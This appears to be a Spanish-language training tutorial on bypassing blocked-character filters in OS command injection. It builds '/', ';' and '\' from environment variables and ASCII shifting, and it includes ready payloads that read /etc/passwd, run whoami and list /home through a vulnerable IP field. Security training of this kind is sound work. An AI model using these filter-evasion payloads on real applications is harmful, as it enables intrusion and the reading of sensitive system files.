
---
# **Bypassing de Caracteres Bloqueados en Inyección de Comandos**

Las aplicaciones pueden bloquear ciertos caracteres como **slashes (`/` y `\`) y puntos y comas (`;`)**, ya que son esenciales para la navegación de directorios y ejecución de comandos. Sin embargo, existen diversas formas de generar estos caracteres sin escribirlos directamente.

---

## **1. Uso de Variables de Entorno (Linux)**

Podemos extraer caracteres de variables de entorno usando la sintaxis `${VAR:start:length}`.

### **Ejemplo: Obtener `/` desde `$PATH`**

```bash
echo ${PATH:0:1}
```

Salida:

```
/
```

En un payload:

```
127.0.0.1${PATH:0:1}etc${PATH:0:1}passwd
```

Accedería a `/etc/passwd` sin necesidad de escribir `/` explícitamente.

### **Ejemplo: Obtener `;` desde `$LS_COLORS`**

```bash
echo ${LS_COLORS:10:1}
```

Salida:

```
;
```

En un payload:

```
127.0.0.1${LS_COLORS:10:1}${IFS}whoami
```

Evitando filtros de `;` y espacios simultáneamente.

---

## **2. Uso de Variables de Entorno (Windows)**

El mismo principio se aplica en **Windows CMD y PowerShell**.

### **Ejemplo en CMD para obtener `\`**

```cmd
echo %HOMEPATH:~6,-11%
```

Salida:

```
\
```

### **Ejemplo en PowerShell para obtener `\`**

```powershell
$env:HOMEPATH[0]
```

Salida:

```
\
```

Para listar todas las variables de entorno en PowerShell:

```powershell
Get-ChildItem Env:
```

Esto permite identificar variables útiles para evadir filtros.

---

## **3. Character Shifting (Desplazamiento de Caracteres)**

Se puede obtener un carácter evitando su uso directo mediante **desplazamiento en la tabla ASCII**.

### **Ejemplo en Linux para obtener `\`**

```bash
man ascii     # \ está en 92, el carácter anterior es [ en 91
echo $(tr '!-}' '"-~'<<<[)
```

Salida:

```
\
```

### **Ejercicio: Obtener `;` con Character Shifting**

1. Buscar el carácter anterior a `;` en ASCII (`:` en 58).
2. Aplicar:

```bash
echo $(tr '!-}' '"-~'<<<:)
```

Salida esperada:

```
;
```

---

## **Conclusión**

- **Variables de entorno** permiten generar caracteres prohibidos.
- **Character shifting** permite evadir filtros mediante desplazamiento ASCII.
- **Ambas técnicas pueden combinarse** con otros bypasses como `$IFS` o brace expansion.

Estas técnicas son esenciales para **evadir WAFs y filtros de seguridad** en inyecciones de comandos.

### EJercicio

127.0.0.1%0a{ls,-la,${PATH:0:1}home}